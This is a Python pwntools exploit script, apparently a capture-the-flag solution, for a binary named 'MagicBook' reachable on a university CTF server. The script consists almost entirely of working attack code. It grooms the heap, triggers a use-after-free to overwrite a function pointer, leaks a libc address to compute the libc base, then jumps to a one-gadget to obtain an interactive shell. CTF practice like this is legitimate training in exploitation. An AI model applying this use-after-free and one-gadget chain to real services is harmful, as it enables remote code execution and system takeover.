#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *   # pip install pwntools
context.arch = "amd64"

if "remote" in sys.argv:
    r = remote("bamboofox.cs.nctu.edu.tw", 58798)
else:
    r = process("./MagicBook")
libc = ELF("./libc.so.6-14c22be9aa11316f89909e4237314e009da38883")

pause()

def Add(i, chant):
    r.sendlineafter("Choose a feature :", "1")
    r.sendlineafter("Which page of magic book do you want to use :", str(i))
    r.sendlineafter("What's the length of your chant :", str(len(chant)))
    r.sendafter("What's your chant :", chant)

def Del(i):
    r.sendlineafter("Choose a feature :", "2")
    r.sendlineafter("Which page of magic book do you want to use :", str(i))

def Spell(i):
    r.sendlineafter("Choose a feature :", "3")
    r.sendlineafter("Which page of magic book do you want to use :", str(i))

Add(1, "A" * 16) # alloc 16 16
Add(2, "A" * 64) # alloc 16 64
Del(1)           # free 16 16
Del(2)           # free 16 64
Add(3, flat(0x400826, 0x602048)) # alloc 16 16
Spell(1) # uaf
r.recvuntil("Magic Time !!! \n")
leak = r.recvuntil("\n...", drop=True)
libc_base = u64(leak.ljust(8, "\x00")) - libc.symbols["malloc"]
log.info("libc_base=" + hex(libc_base))

Del(3)
Add(3, flat(libc_base + 0x45216, 0))
Spell(1)

r.interactive()

